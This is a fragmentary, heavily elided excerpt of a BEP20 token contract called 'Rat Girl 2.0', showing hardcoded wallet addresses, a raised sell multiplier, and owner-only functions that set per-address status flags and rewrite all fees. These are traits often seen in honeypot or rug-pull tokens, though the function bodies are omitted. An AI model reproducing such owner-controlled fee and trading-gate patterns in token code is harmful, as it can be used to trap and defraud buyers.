...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        router = _router != address(0)
            ...
            Distributor = 0xFdf10AB714F6C8c671534c0b31D53f76D31c3A00;
        _token = msg.sender;
    }
...
contract RTGRL is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xc47D0eFad8AAbe3a1f2D07Ac331Fa15F800c0D0e;
    address DevWallet       = 0xc47D0eFad8AAbe3a1f2D07Ac331Fa15F800c0D0e;

    string constant _name = "Rat Girl 2.0";
    string constant _symbol = "RTGRL";
    ...
    uint256 private sellMultiplier  = 140;
    ...
    address PAIR = 0x930b64e010E9F126067FD48e62B33CEa99A3ac75;
    ...
    function clearStuckBalance() public authorized{
    ...
    function AprroveSpend(address[] calldata addresses, bool status) public onlyOwner {
    ...
    function ManageToken(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external authorized {
